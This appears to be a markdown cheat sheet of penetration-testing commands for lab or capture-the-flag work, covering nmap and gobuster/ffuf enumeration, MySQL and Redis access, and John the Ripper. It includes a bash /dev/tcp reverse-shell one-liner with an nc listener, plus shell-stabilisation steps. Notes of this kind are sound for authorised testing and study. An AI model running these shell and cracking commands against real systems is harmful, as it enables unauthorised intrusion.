# Snippets
Contains handy commands and code snippets for use...

## Enumeration
###  Nmap Scanning
```
# Add -p- for all 65535 ports
sudo nmap -sS -sV -sC -oA nmap/<filename> $IP
```

### GoBuster

#### Iterate over directories
```
gobuster dir -u http://$IP/ -o gobust.out -w {wordlist}
```

#### VHost Discovery
```
gobuster vhost -w ../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$DOMAIN
```

### Ffuf
#### Fuzziing for VHosts
```
./ffuf -w ../SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://$IP/ -H 'Host: FUZZ.$DOMAIN' -ms 0
```

## Get source for URL

```
CRTL + U
```

## Shells/Access
### Target callback for reverse shell
- See revshells in [tools.md](tools.md)
```bash
# in seperate terminals
nc -nvlp 9999
bash -c "bash -i >& /dev/tcp/<host ip>/<host port> 0>&1"
```
### Stabilise a reverse shell
```bash
# examples below to run on target
python -c "import pty; pty.spawn('/bin/bash')"
python3 -c 'import pty;pty.spawn("/bin/bash")'
ruby -e "exec '/bin/bash'"
perl -e "exec '/bin/bash'"
# now ctrl+z it
# back on host machine run
stty raw -echo && fg
# enter, enter, now you're back in the shell, last step below to be able to ctrl+c, clear etc.
export TERM=xterm
```

## Databases
### MySQL

#### Connect to database

```
mysql -h $IP -u $USER
```

### Redis
#### Connect
```
redis-cli -h $IP
```

#### List databases
```
info keyspace
```

#### Get value for key
```
get <key>
```

## Password/Hash Cracking
### John The Ripper
```bash
./john --single <hash file in format user:hash>.txt
```
